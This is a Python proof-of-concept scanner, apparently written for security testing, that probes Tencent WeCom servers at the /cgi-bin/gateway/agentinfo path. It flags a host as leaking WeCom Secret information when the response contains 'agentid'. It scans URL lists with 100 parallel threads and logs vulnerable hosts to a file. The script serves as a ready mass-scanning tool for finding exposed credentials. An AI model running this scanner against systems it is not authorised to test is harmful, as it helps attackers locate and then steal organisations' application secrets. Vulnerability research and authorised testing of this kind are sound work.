# app="Tencent-企业微信"
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
        
            ██╗    ██╗███████╗ ██████╗██╗  ██╗ █████╗ ████████╗
            ██║    ██║██╔════╝██╔════╝██║  ██║██╔══██╗╚══██╔══╝
            ██║ █╗ ██║█████╗  ██║     ███████║███████║   ██║   
            ██║███╗██║██╔══╝  ██║     ██╔══██║██╔══██║   ██║   
            ╚███╔███╔╝███████╗╚██████╗██║  ██║██║  ██║   ██║   
             ╚══╝╚══╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝ 
                                                            author: 秋妤
                                                            date: 2024.09.29
                                                            version: 1.0                               
    """


def poc(target):
    payload = '/cgi-bin/gateway/agentinfo'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    proxie = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target, verify=False)
        if res.status_code == 200:
            response = requests.get(url=target+payload, headers=headers, verify=False,timeout=10)
            if response.status_code == 200 and 'agentid' in response.text:
                print(f"[+] 该网址存在企业微信Secret信息泄露 {target}")
                with open('wechat_result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f"[-] 该网址不存在企业微信Secret信息泄露 {target}")
    except Exception as e:
        print(e)


def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()